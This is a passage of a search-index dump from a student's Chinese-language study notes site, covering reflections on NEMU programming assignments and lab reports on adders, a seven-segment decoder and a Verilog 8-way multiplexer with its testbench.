Fault\uff0c\u5927\u6982\u662f\u5206\u9875\u673a\u5236\u5bfc\u81f4\u7684\u6743\u9650\u95ee\u9898\uff0c\u6839\u636e\u5b9e\u9a8c\u624b\u518c\u7684\u63d0\u793a\uff0c\u7ed9\u9875\u8868\u9879\u52a0\u4e86\u4e9b flag \u7b97\u662f\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002\u4f46\u662f\u7279\u6743\u7ea7\u7ed5\u6765\u7ed5\u53bb\u4e0d\u592a\u6e05\u695a\u600e\u4e48\u6539\uff0c\u6709\u70b9\u590d\u6742\u3002\u800c\u4e14\u540e\u9762\u5230\u4e86\u65f6\u949f\u4e2d\u65ad\u5c31\u8981\u629b\u5f03 difftest \u4e86\uff0c\u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u5f00\u6446\u4e86\u3002</p>"},{"location":"cs/system/pa/#pa43","title":"PA4.3","text":"<p>\u6700\u540e\u8fd9\u90e8\u5206\u65f6\u949f\u4e2d\u65ad\u548c\u62a2\u5360\u5f0f\u8c03\u5ea6\u5176\u5b9e\u90fd\u8fd8\u597d\u5199\u3002\u4f46\u662f\u540e\u9762\u5185\u6838\u6808\u548c\u7528\u6237\u6808\u5207\u6362\u770b\u7684\u6709\u70b9\u8ff7\u8ff7\u7cca\u7cca\u4e86\uff0c\u53ef\u80fd\u662f\u5206\u9875\u673a\u5236\u5c31\u4e0d\u592a\u719f\u7684\u7f18\u6545\uff0c\u4e5f\u662f\u5199\u5f97\u80fd\u8dd1\u5c31\u884c\u4e86\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8bb0\u4e86\uff0c\u4e4b\u540e\u7406\u89e3\u6e05\u695a\u4e86\u518d\u8865\u5145\u3002</p> <p>\u603b\u4e4b\u8fd9\u5c31\u662f\u80fd\u56de\u5fc6\u8d77\u6765\u7684\u5168\u90e8\u503c\u5f97\u4e00\u8bb0\u7684\u5185\u5bb9\u4e86\u3002</p>"},{"location":"cs/system/pa/#_6","title":"\u9057\u7559\u95ee\u9898","text":"<p>\u7b2c\u4e00\u904d\u5237 PA\uff0c\u4e5f\u60f3\u7740\u65e2\u7136\u6709\u4e86\u70b9\u57fa\u7840\uff0c\u90a3\u5c31\u5c3d\u5feb\u5b8c\u6210\uff08\u7559\u51fa\u7684\u65f6\u95f4\u8fd8\u80fd\u5e72\u70b9\u522b\u7684\uff09\uff0c\u867d\u7136\u8bf4\u5fc5\u505a\u4efb\u52a1\u90fd\u5b8c\u6210\u4e86\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u4e00\u4e9b\u9009\u505a\u4efb\u52a1\u8fd8\u6ca1\u505a\uff0c\u7559\u4e86\u4e00\u70b9\u9057\u61be\u3002\u4ee5\u540e\u6709\u673a\u4f1a\u4e8c\u5237\u7684\u65f6\u5019\u518d\u5b8c\u6574\u5b8c\u6210\uff08\u6211\u4f30\u8ba1\u53ef\u80fd\u4f1a\u5495\uff09\u3002</p> <ul> <li>PA2.2 trace \u6709\u70b9\u8bef\u89e3\u4e86\uff0c\u6211\u4ee5\u4e3a\u90fd\u662f\u5728 sdb \u4e2d\u901a\u8fc7\u547d\u4ee4\u624b\u52a8\u8f93\u51fa\u7684\uff0c\u4f46\u5176\u5b9e\u5728\u89e6\u53d1\u7684\u65f6\u5019\u76f4\u63a5 Log \u51fa\u6765\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u9009\u62e9</li> <li>PA2.2 klib \u6ca1\u6709\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5199\u5b8c\u4e86\u76f4\u63a5\u5f00\u8dd1</li> <li>PA2.3 \u58f0\u5361\u5b9e\u73b0\u4e86\uff0c\u4f46\u662f\u542c\u8d77\u6765\u6709\u6742\u97f3\uff0c\u53ef\u80fd\u662f\u5199\u7684\u6709\u70b9\u95ee\u9898\uff0c\u6ca1\u518d\u7ec6\u8c03\uff0c\u540e\u9762\u58f0\u5361\u76f8\u5173\u7684\u9009\u505a\u4e5f\u6ca1\u518d\u505a</li> <li>PA2.3 \u6700\u540e\u9009\u505a\u7684\u4f18\u5316 LiteNES\u3001\u5728 NEMU \u4e0a\u8dd1 NEMU \u7684\u4e24\u4e2a\u5b9e\u9a8c\u770b\u8d77\u6765\u633a\u6709\u8da3\uff0c\u4f46\u6ca1\u505a</li> <li>PA3.2 \u9009\u505a\u7684\u201d\u652f\u6301\u591a\u4e2a ELF \u7684 ftrace\u201c\u6ca1\u505a\uff0c\u8fd8\u8981\u8bfb\u53d6\u3001\u8fd8\u8981\u89e3\u6790\u3001\u8fd8\u8981\u8ba1\u7b97\uff0c\u61d2\u5f97\u5199\u4e86\uff08x</li> <li>PA3.3 \u5728 Navy \u4e0a\u8fd0\u884c am-kernels\u3001fceux\u3001oslab \u4ee5\u53ca\u5e26\u58f0\u97f3\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u9009\u505a\u90fd\u6ca1\u505a</li> <li>PA3.3 \u81ea\u7531\u5f00\u5173 difftest\uff0c\u5feb\u7167\u529f\u80fd\u90fd\u6ca1\u505a\uff0c\u56e0\u4e3a\u6211\u597d\u50cf\u4e5f\u6ca1\u600e\u4e48\u7528\u8fc7 sdb \u6765\u8c03\u8bd5\uff0c\u800c\u4e14 difftest \u4e0d\u7528\u7684\u65f6\u5019\u6211\u5c31\u76f4\u63a5\u5173\u6389\u4e86</li> <li>PA4.2 \u6dfb\u52a0\u5206\u9875\u673a\u5236\u540e\u66b4\u9732\u51fa\u4e86 NEMU \u7684\u7279\u6743\u7ea7\u7ba1\u7406\u6ca1\u505a\u597d\uff0c\u5bfc\u81f4 difftest \u51fa\u73b0\u4e86\u95ee\u9898\uff08mstatus \u5bf9\u4e0d\u4e0a\uff0c\u6216\u8005\u8bbf\u5b58\u6743\u9650\u5f02\u5e38\uff09\uff0c\u8c03\u4e86\u534a\u5929\u6ca1\u8c03\u597d\uff0c\u6682\u65f6\u653e\u5f03\u4e86\uff08\u53cd\u6b63\u5feb\u5230\u65f6\u949f\u4e2d\u65ad\u4e5f\u8981\u629b\u5f03 difftest \u4e86\uff09</li> <li>PA4.3 \u5185\u6838\u6808\u7528\u6237\u6808\u5207\u6362\uff0c\u8fd8\u6709\u524d\u9762\u7684\u5206\u9875\u673a\u5236\u914d\u5408\u8d77\u6765\uff0c\u53ef\u80fd\u8fd8\u9700\u8981\u518d\u6df1\u5165\u7406\u89e3\u7406\u89e3</li> <li>PA4.3 \u6700\u540e\u9009\u505a\u7684\u8fd0\u884c ONScripter \u90e8\u5206\u90fd\u6ca1\u6709\u505a\uff08\u6709\u58f0\u97f3\u548c\u78c1\u76d8\u7684\u5185\u5bb9\uff09</li> <li>\u6700\u540e\u5173\u4e8e ISA\uff0cx86 \u7684\u770b\u8d77\u6765\u4e5f\u6709\u70b9\u610f\u601d\uff08\u867d\u7136\u53d6\u6307\u8bd1\u7801\u770b\u8d77\u6765\u6709\u4e9b\u7e41\u7410\uff09\uff0c\u800c\u4e14\u4ee5\u540e\u5e94\u8be5\u4e5f\u4f1a\u8f83\u591a\u63a5\u89e6\uff0c\u6216\u8bb8\u53ef\u4ee5\u770b\u770b\u3002mips \u7684\u540e\u671f\u770b\u8d77\u6765\u5c31\u6709\u70b9\u75db\u82e6\u9762\u5177\uff0c\u5305\u62ec difftest \u5206\u652f\u5ef6\u8fdf\u7684\u5904\u7406\uff0c\u8fd8\u6709\u5947\u602a\u5206\u9875\u673a\u5236\u4ec0\u4e48\u7684\uff0c\u53ef\u80fd\u4e0d\u4f1a\u5c1d\u8bd5</li> </ul>"},{"location":"cs/system/cs1/","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\uff1a \u00a0\u00a0\u8bfe\u7a0b\u53f7\uff1a21121830 \u00a0\u00a0\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u00a0\u00a0\u5305\u542b\u5e38\u89c4\u610f\u4e49\u4e0a\u7684 \u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840 \u548c \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9 \u00a0\u00a0\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160</p>"},{"location":"cs/system/cs1/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u7406\u8bba\u90e8\u5206<ul> <li>\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406</li> <li>\u6570\u5b57\u903b\u8f91\u57fa\u7840\uff08TODO\uff09</li> <li>\u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08TODO\uff09</li> <li>\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08TODO\uff09</li> <li>\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784</li> <li>\u5904\u7406\u5668\uff08TODO\uff09</li> </ul> </li> <li>\u5b9e\u9a8c\u90e8\u5206<ul> <li>lab1-1: \u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668</li> <li>lab1-2: \u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5</li> <li>lab2-1: \u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668</li> <li>lab2-2: \u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668</li> <li>lab3: \u4e03\u6bb5\u7ba1\u663e\u793a\u5668</li> <li>lab4-1: RISC-V \u6c47\u7f16\u5b9e\u9a8c</li> <li>lab4-2: overflow \u7406\u89e3</li> <li>lab5-1: \u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1</li> <li>lab5-2: \u5355\u5468\u671f CPU \u8bbe\u8ba1</li> </ul> </li> </ul> <p>PS\uff1a\u8fd9\u91cc\u7684 TODO \u5927\u6982\u7387\u4e0d\u4f1a\u518d\u5199\u4e86\uff0c\u9664\u975e\u5f53\u52a9\u6559\uff08x</p>"},{"location":"cs/system/cs1/lab1-1/","title":"\u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668","text":"<p> \u7ea6 766 \u4e2a\u5b57  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab1-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.11 ~ 2022.03.25\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab1-1/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u4f7f\u7528 Logisim \u5b9e\u73b0\u56db\u4f4d\u5168\u52a0\u5668 <ol> <li>\u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 full_adder.circ</li> <li>\u6587\u4ef6\u4e2d\u8868\u660e\u4e86\u8be5\u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u5176\u4e2d A_0 \u81f3 A_3 \u662f A \u4fe1\u53f7\u4e3a\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d\u3002\u540c\u7406 B_0 \u81f3 B_3 \u662f B \u4fe1\u53f7\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d\uff0cCin \u662f\u8fdb\u4f4d\u8f93\u5165\uff1bS_out0 \u81f3 S_out3 \u662f S \u8f93\u51fa\u4fe1\u53f7\u4ece\u4f4e\u5230\u9ad8\u7684 4 \u4e2a\u4f4d\uff0cCout \u662f\u8fdb\u4f4d\u8f93\u51fa</li> <li>\u5b9e\u73b0\u6b63\u786e\u7684\u56db\u4f4d\u5168\u52a0\u5668\u7684\u7535\u8def\u7ed8\u753b\uff08\u5176\u4e2d\u7684\u7aef\u53e3\u53ef\u4ee5\u590d\u5236\u4f7f\u7528\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 poke tool \u66f4\u6539\u8f93\u5165\u4fe1\u53f7\uff09</li> </ol> </li> <li>\u4f7f\u7528 Logisim \u5b9e\u73b0\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668<ol> <li>\u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 encoder.circ</li> <li>\u6587\u4ef6\u4e2d\u8868\u660e\u4e86\u8be5\u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u5176\u4e2d A_0 \u81f3 A_3 \u662f A \u4fe1\u53f7\u4e3a\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d</li> <li>\u540c\u7406 B_0 \u81f3 B_6 \u662f B \u8f93\u51fa\u4fe1\u53f7\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 7 \u4e2a\u4f4d</li> <li>\u6b63\u786e\u8fde\u63a5\u8f93\u51fa\u4fe1\u53f7\u81f3\u4e03\u6bb5\u7ba1\u76f8\u5bf9\u5e94\u7684\u5f15\u811a</li> <li>\u5b9e\u73b0\u6b63\u786e\u7684\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab1-1/#_3","title":"\u56db\u4f4d\u5168\u52a0\u5668","text":"<p>\u56db\u4f4d\u5168\u52a0\u5668\u53ef\u4ee5\u901a\u8fc7\u5c06\u56db\u4e2a\u4e00\u4f4d\u5168\u52a0\u5668\u8fde\u63a5\u76f4\u63a5\u5f97\u5230\uff08\u6bcf\u4e00\u4f4d\u7684 Cout \u5bf9\u63a5\u5230\u9ad8\u4e00\u4f4d\u7684 Cin\uff0c\u6700\u4f4e\u4f4d Cin \u4e3a\u8f93\u5165\u4fe1\u53f7\u7684 Cin\uff0c\u6700\u9ad8\u4f4d\u7684 Cout \u4e3a\u8f93\u51fa\u4fe1\u53f7\u7684 Cout\uff09</p>"},{"location":"cs/system/cs1/lab1-1/#_4","title":"\u4e00\u4f4d\u5168\u52a0\u5668","text":"<p>\u4e00\u4f4d\u5168\u52a0\u5668\u6709\u4e09\u4e2a\u8f93\u5165 A\u3001B\u3001Cin\uff0c\u4e24\u4e2a\u8f93\u51fa S\u3001Cout\u3002\u5176\u771f\u503c\u8868\uff1a</p> A B Cin S Cout 0 0 0 0 0 1 0 0 0 1 0 1 0 0 1 1 1 0 1 0 0 0 1 0 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 <p>\u53ef\u4ee5\u53d1\u73b0 S \u662f A\u3001B\u3001Cin \u7684\u5f02\u6216\u548c\uff0cCout \u4e5f\u53ef\u4ee5\u63a8\u5bfc\u5f97\u51fa\uff1a</p> \\[ S = (A\\oplus B)\\oplus Cin\\\\ Cout = (A\\&amp;B) |((A\\oplus B)\\&amp;Cin) \\] <p>\u6309\u7167\u8fd9\u4e2a\u903b\u8f91\u6784\u9020\u51fa\u903b\u8f91\u7535\u8def\u5373\u53ef\uff1a</p>"},{"location":"cs/system/cs1/lab1-1/#_5","title":"\u56db\u4f4d\u5168\u52a0\u5668","text":"<p>\u76f4\u63a5\u5c06\u4e00\u4f4d\u5168\u52a0\u5668\u590d\u5236\u6210\u56db\u5206\uff0c\u6bcf\u4e2a\u8d1f\u8d23\u5bf9\u5e94\u4f4d\u6570\u76f8\u52a0\u5e76\u5e26\u4e0a\u4f4e\u4e00\u4f4d\u7684\u8fdb\u4f4d\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\u7684\u4e00\u4f4d\uff0c\u5e76\u4e14\u5c06\u8f93\u51fa\u7684\u8fdb\u4f4d\u4f20\u7ed9\u9ad8\u4e00\u4f4d</p> <p>\u903b\u8f91\u7535\u8def\u56fe\uff1a</p> <p></p>"},{"location":"cs/system/cs1/lab1-1/#_6","title":"\u6d4b\u8bd5","text":"<p>\u4ee4 A = 0 ~ 15\u3001B = 0 ~ 15\u3001Cin = 0/1\uff0c\u5747\u8fdb\u884c\u4e86\u6d4b\u8bd5\uff0c\u7ed3\u679c\u548c\u6b63\u5e38\u52a0\u6cd5\u7ed3\u679c\u76f8\u540c\uff0c\u5e76\u4e14\u5df2\u7ecf\u4ea4\u7ed9 TA \u9a8c\u6536\u8fc7\u3002</p>"},{"location":"cs/system/cs1/lab1-1/#_7","title":"\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668","text":""},{"location":"cs/system/cs1/lab1-1/#_8","title":"\u5b9e\u9a8c\u601d\u8def","text":"<p>\u8fde\u63a5\u8f93\u51fa\u4fe1\u53f7\u5230\u4e03\u6bb5\u7ba1\u5f15\u811a\u53ef\u4ee5\u76f4\u63a5\u5bf9\u5e94\u4e03\u6bb5\u7ba1\u5f15\u811a\u4e0e LED \u6761\u7684\u5bf9\u5e94\u5173\u7cfb\u76f4\u63a5\u8fde\u63a5</p> <p>\u5c06\u8f93\u5165\u4fe1\u53f7\u8f6c\u4e3a\u8f93\u51fa\u4fe1\u53f7\u53ef\u4ee5\u5148\u5199\u51fa\u5bf9\u5e94\u7684\u771f\u503c\u8868\uff0c\u7136\u540e\u4f7f\u7528 Logisim \u5185\u7f6e\u7684 \"Combinational Analysis\" \u529f\u80fd\u6784\u5efa\u903b\u8f91\u7535\u8def\uff0c\u907f\u514d\u91cd\u590d\u52b3\u52a8</p>"},{"location":"cs/system/cs1/lab1-1/#_9","title":"\u8f93\u51fa\u4fe1\u53f7\u4e0e\u4e03\u6bb5\u7ba1\u5f15\u811a\u8fde\u63a5","text":"<p>\u6839\u636e\u5f15\u811a\u4e0e LED \u6761\u7684\u5bf9\u5e94\u56fe\uff1a</p> <p>\u5e76\u5c06 B0 ~ B6 \u4f9d\u6b21\u89c6\u4e3a A ~ G \u4e03\u4e2a LED \u6761\uff0c\u53ef\u4ee5\u8fde\u63a5\u51fa\uff1a</p>"},{"location":"cs/system/cs1/lab1-1/#_10","title":"\u8bd1\u7801\u5668","text":"<p>\u73b0\u6709\u8f93\u5165 A\uff08\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d A3 ~ A0\uff09\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u4e00\u4e2a\u6570\uff0c\u8981\u5c06\u5176\u8f6c\u6362\u4e3a\u4e03\u4f4d\u8f93\u51fa B0 ~ B6\uff0c\u771f\u503c\u8868\uff1a</p> <p>\u751f\u6210\u903b\u8f91\u7535\u8def\u56fe\uff1a</p>"},{"location":"cs/system/cs1/lab1-1/#_11","title":"\u6d4b\u8bd5","text":"<p>\u5df2\u7ecf\u7ec4\u5408\u4e86 0000 ~ 1111\uff080 ~ F\uff09\u6240\u6709\u60c5\u51b5\uff0c\u663e\u793a\u5747\u6b63\u5e38\u3002</p>"},{"location":"cs/system/cs1/lab1-2/","title":"\u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5","text":"<p> \u7ea6 521 \u4e2a\u5b57  65 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab1-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.18 ~ 2022.04.01\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab1-2/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u4f7f\u7528 Logisim \u5b8c\u6210\u7535\u8def\u7ea7\u522b\u7684\u591a\u8def\u9009\u62e9\u5668<ol> <li>\u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 multi.circ</li> <li>\u6587\u4ef6\u7684 Standard sample \u4f7f\u7528\u4e86 1 \u4f4d\u7684\u56db\u8def\u9009\u62e9\u5668\uff0c\u5b9e\u73b0\u4e86\u901a\u8fc7\u6539\u53d8 SW \u5bf9\u8f93\u5165\u7684\u9009\u62e9</li> <li>\u5728\u672c\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u4e3a\u4e86\u7406\u89e3\u591a\u8def\u9009\u62e9\u5668\u7684\u7535\u8def\u7ea7\u522b\u5177\u4f53\u5b9e\u73b0\uff0c\u653e\u5f03\u4f7f\u7528 Logisim \u5c01\u88c5\u7684\u591a\u8def\u9009\u62e9\u5668\uff0c\u53ea\u91c7\u7528\u95e8\u7ea7\u7535\u8def\uff0c\u5b8c\u6210 Standard sample \u7684\u529f\u80fd\u5b9e\u73b0</li> </ol> </li> <li>\u4f7f\u7528 Vivado \u5b9e\u73b0\u591a\u8def\u9009\u62e9\u5668<ol> <li>\u6253\u5f00 Vivado \u8f6f\u4ef6\uff0c\u6309\u7167\u5b9e\u9a8c 1 \u7684\u52a0\u5165\u6587\u4ef6\u65b9\u5f0f\uff0c\u52a0\u5165\u8bbe\u8ba1\u6587\u4ef6\u6837\u4f8b\u6587\u4ef6 Multi_2CH32.v</li> <li>\u540c\u6837\u52a0\u5165\u6d4b\u8bd5\u6587\u4ef6 Mul_test.v</li> <li>\u8fd9\u4e2a\u6d4b\u8bd5\u6587\u4ef6\u662f 32 \u4f4d 2 \u8def\u9009\u62e9\u5668\u7684\u6837\u4f8b\u6587\u4ef6\uff0c\u4f7f\u7528 Run Simulation \u53ef\u4ee5\u4eff\u771f\u3002\u901a\u8fc7\u66f4\u6539 SW \u7684\u503c\uff0c\u591a\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u9009\u62e9 data1 \u6216\u8005 data0 \u8fdb\u884c\u8f93\u51fa</li> <li>\u672c\u6b21\u5b9e\u9a8c\u8981\u6c42\uff0c\u53c2\u8003\u8bbe\u8ba1\u6587\u4ef6\u6837\u4f8b\u6587\u4ef6 Multi_2CH32.v \u7684 32 \u4f4d 2 \u8def\u9009\u62e9\u5668\uff0c\u4f7f\u7528 verilog \u4ee3\u7801\u5b8c\u6210 32 \u4f4d 8 \u8def\u9009\u62e9\u5668\u3002\u547d\u540d\u4e3a Multi_8CH32.v</li> <li>\u540c\u7406\u9700\u8981\u53c2\u8003\u6d4b\u8bd5\u6587\u4ef6 Mul_test.v\uff0c\u81ea\u4e3b\u7f16\u5199\u6d4b\u8bd5\u7684 testbench \u6587\u4ef6</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab1-2/#_3","title":"\u7535\u8def\u7ea7\u522b\u591a\u8def\u9009\u62e9\u5668\u642d\u5efa","text":"<p>\u4e00\u4f4d\u56db\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u4f7f\u7528\u4e09\u4e2a\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u62fc\u63a5\u5f62\u6210\uff0c\u6240\u4ee5\u5148\u6765\u5b9e\u73b0\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668</p>"},{"location":"cs/system/cs1/lab1-2/#_4","title":"\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u642d\u5efa","text":"<p>\u5047\u8bbe\u4e24\u8def\u8f93\u5165\u5206\u522b\u4e3a A\u3001B\uff0c\u5f00\u5173\u4e3a S\uff0c\u5219\u6700\u7ec8\u7684\u8f93\u51fa\u4e3a AS+BS\uff0c\u8f6c\u4e3a\u903b\u8f91\u7535\u8def\uff1a</p> <p></p>"},{"location":"cs/system/cs1/lab1-2/#_5","title":"\u4e00\u4f4d\u56db\u8def\u9009\u62e9\u5668","text":"<p>\u4f7f\u7528\u4e09\u4e2a\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u8fde\u63a5\u5373\u53ef\uff1a</p>"},{"location":"cs/system/cs1/lab1-2/#_6","title":"\u6d4b\u8bd5","text":"<p>\u5df2\u7ecf\u4f7f\u7528\u5168\u90e8\u7684\u8f93\u5165\u548c\u5f00\u5173\u7ec4\u5408\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u5747\u6b63\u786e\u3002</p>"},{"location":"cs/system/cs1/lab1-2/#verilog","title":"Verilog \u5b9e\u73b0\u591a\u8def\u9009\u62e9\u5668","text":"<p>\u4eff\u7167\u6240\u7ed9\u7684 Multi_2CH32.v \u4f7f\u7528 case \u8bed\u53e5\u5373\u53ef\u5b9e\u73b0</p>"},{"location":"cs/system/cs1/lab1-2/#_7","title":"\u4ee3\u7801","text":"<pre><code>`timescale 1ns / 1ps\n\nmodule Multi_8CH32(\n    input [2:0]SW,      // \u4e09\u4f4d\u4e8c\u8fdb\u5236\u6570\u8868\u793a\u5f00\u5173\u9009\u62e9\u72b6\u6001\n    input [31:0]Data0,  // \u516b\u4e2a\u4e09\u5341\u4e8c\u4f4d\u6570\u5f85\u9009\u62e9\n    input [31:0]Data1,\n    input [31:0]Data2,\n    input [31:0]Data3,\n    input [31:0]Data4,\n    input [31:0]Data5,\n    input [31:0]Data6,\n    input [31:0]Data7,\n    output reg [31:0]Disp_num // \u8f93\u51fa\u7684 32 \u4f4d\u6570\n);\n    always @ (*)\n    begin\n    case (SW)  // \u5224\u65ad SW \u7684\u516b\u4e2a\u503c\uff0c\u5206\u522b\u4e3a\u8f93\u51fa\u8d4b\u503c\n        3'b000: begin Disp_num = Data0; end\n        3'b001: begin Disp_num = Data1; end\n        3'b010: begin Disp_num = Data2; end\n        3'b011: begin Disp_num = Data3; end\n        3'b100: begin Disp_num = Data4; end\n        3'b101: begin Disp_num = Data5; end\n        3'b110: begin Disp_num = Data6; end\n        3'b111: begin Disp_num = Data7; end\n    endcase\n    end\nendmodule\n</code></pre>"},{"location":"cs/system/cs1/lab1-2/#_8","title":"\u6d4b\u8bd5","text":"<p>\u7f16\u5199\u4e86\u4eff\u771f\u6587\u4ef6\u7528\u6765\u6d4b\u8bd5\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule Mul_test();\nreg [31:0]data0 = 32'hAA1111AA; // \u4efb\u610f\u7684\u516b\u4e2a\u5f85\u9009\u62e9\u503c\nreg [31:0]data1 = 32'hBB2222BB;\nreg [31:0]data2 = 32'hCC3333CC;\nreg [31:0]data3 = 32'hDD4444DD;\nreg [31:0]data4 = 32'hEE5555EE;\nreg [31:0]data5 = 32'hFF6666FF;\nreg [31:0]data6 = 32'h00777700;\nreg [31:0]data7 = 32'h11888811;\nreg [2:0]SW;  // \u5f00\u5173\u72b6\u6001\nwire [31:0]out;\nMulti_8CH32 ut(\n    .SW(SW),\n    .Data0(data0),\n    .Data1(data1),\n    .Data2(data2),\n    .Data3(data3),\n    .Data4(data4),\n    .Data5(data5),\n    .Data6(data6),\n    .Data7(data7),\n    .Disp_num(out)\n);\ninitial\nbegin\nSW = 3'b000;       // \u6d4b\u8bd5 SW \u6240\u6709\u503c\u4e0b\u7684\u7ed3\u679c\n#125 SW = 3'b001;\n#125 SW = 3'b010;\n#125 SW = 3'b011;\n#125 SW = 3'b100;\n#125 SW = 3'b101;\n#125 SW = 3'b110;\n#125 SW = 3'b111;\nend\nendmodule\n</code></pre> \u4eff\u771f\u7ed3\u679c\uff1a </p> <p>\u4ece\u65f6\u5e8f\u56fe\u548c\u4e0a\u9762\u6807\u6ce8\u7684\u6570\u503c\u53ef\u4ee5\u770b\u51fa\u786e\u5b9e\u6309\u7167\u6b63\u5e38\u9884\u671f\u8fd0\u884c\u4e86\u3002</p>"},{"location":"cs/system/cs1/lab2-1/","title":"\u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668","text":"<p> \u7ea6 675 \u4e2a\u5b57  299 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab2-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.25 ~ 2022.04.08\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab2-1/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0832-bit ripple-carry adder\uff09<ol> <li>\u6309\u7167 ripple-carry adder \u539f\u7406\uff0c\u4f7f\u7528 verilog \u5b9e\u73b0 32-bit \u7684 ripple-carry adder</li> <li>\u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u52a0\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5</li> 